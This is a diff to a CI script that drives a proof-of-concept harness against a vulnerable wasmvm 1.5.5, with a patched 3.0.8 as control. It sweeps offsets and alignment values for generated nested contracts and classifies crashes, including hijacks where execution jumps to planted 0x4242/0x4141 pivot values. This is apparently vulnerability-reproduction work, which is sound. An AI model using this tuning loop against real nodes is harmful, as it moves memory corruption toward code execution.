@@ -116,15 +116,17 @@ if [ -n "$PY" ]; then
     echo "  $MODE fixed: $(grep -m1 'query gas' "ci-out/harness/probe-$MODE-fixed.stderr" | cut -c1-160)" | tee -a "$OUT/sweep.log"
   done
 
-  echo "--- vulnerable sweep (wasmvm 1.5.5, r=0..511 = all phases, warmups=3):" >&2
-  echo "    geometry: odd warmups => pool [lower B (holder)][guard][upper A (trigger)]; the" >&2
-  echo "    stream descends from the trigger into the holder. 4 warmups = reversed (control)." >&2
+  echo "--- vulnerable phase sweep (dummy=0, r=218..302, warmups=3, distinct slot markers) ---"
+  echo "    geometry: odd warmups => pool [lower B (holder)][guard][upper A (trigger)]; the"
+  echo "    stream descends from the trigger into the holder. Holder-side crash PCs in the"
+  echo "    previous run clustered on JIT pointers (0x..a10); the alignment sweep below shifts"
+  echo "    the holder frame by 8 B per --dummy to walk the batch grid onto a marker slot." >&2
   CRASHES=0
-  for R in $(seq 0 511); do
+  for R in $(seq 218 302); do
     OFF=$((512 - R))
     ITERS=$((65536 + R + 1))
     D="$NESTED/build_r$R"
-    python3 "$NESTED/gen_nested_contracts.py" "$D" --offset "$OFF" --iters "$ITERS" > /dev/null 2>&1 || continue
+    python3 "$NESTED/gen_nested_contracts.py" "$D" --offset "$OFF" --iters "$ITERS" --plants distinct > /dev/null 2>&1 || continue
     for w in holder trigger benign; do
       "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
     done
@@ -135,7 +137,27 @@ if [ -n "$PY" ]; then
       CRASHES=$((CRASHES+1))
     fi
   done
-  echo "vulnerable crashes: $CRASHES / 512" | tee -a "$OUT/sweep.log"
+  echo "phase sweep crashes: $CRASHES / 85" | tee -a "$OUT/sweep.log"
+
+  echo "--- alignment sweep (holder --dummy 1..15 x r=218..302, distinct slot markers) ---"
+  for DUMMY in $(seq 1 15); do
+    for R in $(seq 218 302); do
+      OFF=$((512 - R))
+      ITERS=$((65536 + R + 1))
+      D="$NESTED/al_d${DUMMY}_r$R"
+      python3 "$NESTED/gen_nested_contracts.py" "$D" --offset "$OFF" --iters "$ITERS" --dummy "$DUMMY" --plants distinct > /dev/null 2>&1 || continue
+      for w in holder trigger benign; do
+        "$PY" -c "import wasmtime; open('$D/$w.wasm','wb').write(wasmtime.wat2wasm(open('$D/$w.wat').read()))" 2>/dev/null
+      done
+      if timeout 120 ./harness/harness -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 3 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-vuln-d${DUMMY}-r$R.json" > "ci-out/harness/nested-vuln-d${DUMMY}-r$R.stdout" 2> "ci-out/harness/nested-vuln-d${DUMMY}-r$R.stderr"; then
+        :
+      else
+        CRASHES=$((CRASHES+1))
+      fi
+    done
+    echo "  dummy=$DUMMY done (cumulative crashes: $CRASHES)" | tee -a "$OUT/sweep.log"
+  done
+  echo "total nested crashes: $CRASHES / 1360" | tee -a "$OUT/sweep.log"
   echo "--- fixed control (wasmvm 3.0.8, r=256) ---"
   D="$NESTED/build_r256"
   if timeout 120 ./harness-fixed/harness-fixed -wasm "$D/holder.wasm" -trigger "$D/trigger.wasm" -benign "$D/benign.wasm" -warmups 4 -exec '{}' -gas 10000000000000 -out "ci-out/harness/nested-fixed-r256.json" > "ci-out/harness/nested-fixed-r256.stdout" 2> "ci-out/harness/nested-fixed-r256.stderr"; then
@@ -147,14 +169,19 @@ if [ -n "$PY" ]; then
   python3 - <<'PYEOF'
 import glob, os, json, re
 marker, holder, trigger, hit, clean, errd = [], [], [], [], [], []
-for f in sorted(glob.glob("ci-out/harness/nested-vuln-r*.stderr"), key=lambda p: int(p.split("-r")[-1].split(".")[0])):
-    r = int(f.split("-r")[-1].split(".")[0])
+
+def classify(f, dummy):
+    m = re.search(r'nested-vuln-(?:d(\d+)-)?r(\d+)\.stderr$', f)
+    if not m:
+        return
+    d = int(m.group(1)) if m.group(1) else 0
+    r = int(m.group(2))
+    tag = f"d{d}/r{r}" if d else f"r{r}"
     j = f.replace(".stderr", ".json")
     txt = open(f, errors="replace").read()
     if os.path.exists(j) and os.path.getsize(j) > 0:
-        jt = open(j, errors="replace").read()
-        if '"hit"' in jt:
-            hit.append(r)
+        if '"hit"' in open(j, errors="replace").read():
+            hit.append(tag)
         else:
             err = ""
             try:
@@ -163,25 +190,33 @@ for f in sorted(glob.glob("ci-out/harness/nested-vuln-r*.stderr"), key=lambda p:
             except Exception:
                 pass
             if err:
-                errd.append((r, err[:60]))    # wasm caught the corruption (e.g. OOB access)
+                errd.append((tag, err[:50]))       # wasm caught the corruption (e.g. OOB access)
             else:
-                clean.append(r)
-        continue
+                clean.append(tag)
+        return
     mp = re.search(r'PC=0x([0-9a-f]+)', txt)
     pc = mp.group(1) if mp else "?"
-    if pc.startswith("4242"):
-        marker.append(r)                      # execution jumped to the planted pivot 0x4242...
+    if pc.startswith("4242") or pc.startswith("4141"):
+        marker.append((tag, pc))                   # jumped to a planted pivot/marker value
     elif "nestedQuerier" in txt:
-        trigger.append((r, pc))               # crash inside the nested trigger (stream off stack)
+        trigger.append(tag)                        # crash inside the nested trigger (stream off stack)
     else:
-        holder.append((r, pc))                # crash after the query returned (holder corrupted!)
-# marker-hijack = the aimed-pivot milestone; holder-side = corruption confirmed
-print("MARKER-HIJACKS (PC=0x4242..):", len(marker), marker[:80])
-print("holder-side crashes        :", len(holder), [f"r{r}@0x{pc}" for r, pc in holder[:60]])
-print("trigger-side crashes       :", len(trigger), [f"r{r}" for r, pc in trigger[:40]])
-print("holder-touched (hit attr)  :", len(hit), hit[:80])
-print("holder-error (wasm-caught) :", len(errd), [f"r{r}:{e}" for r, e in errd[:40]])
-print("clean completed            :", len(clean))
+        holder.append((tag, pc))                   # crash after the query returned (holder corrupted!)
+
+for f in sorted(glob.glob("ci-out/harness/nested-vuln-r*.stderr"), key=lambda p: int(p.split("-r")[-1].split(".")[0])):
+    classify(f, 0)
+for f in sorted(glob.glob("ci-out/harness/nested-vuln-d*-r*.stderr"),
+                key=lambda p: (int(p.split("-d")[-1].split("-r")[0]), int(p.split("-r")[-1].split(".")[0]))):
+    classify(f, None)
+
+print("MARKER-HIJACKS (PC=0x41../0x42..):", len(marker), marker[:80])
+print("holder-side crashes              :", len(holder), [f"{t}@0x{pc}" for t, pc in holder[:80]])
+print("trigger-side crashes             :", len(trigger), trigger[:40])
+print("holder-touched (hit attr)        :", len(hit), hit[:80])
+print("holder-error (wasm-caught)       :", len(errd), [f"{t}:{e}" for t, e in errd[:40]])
+print("clean completed                  :", len(clean))
+from collections import Counter
+print("holder PC tails                  :", Counter(pc[-3:] for _, pc in holder).most_common(12))
 f = "ci-out/harness/nested-fixed-r256.json"
 if os.path.exists(f) and os.path.getsize(f):
     d = json.load(open(f))
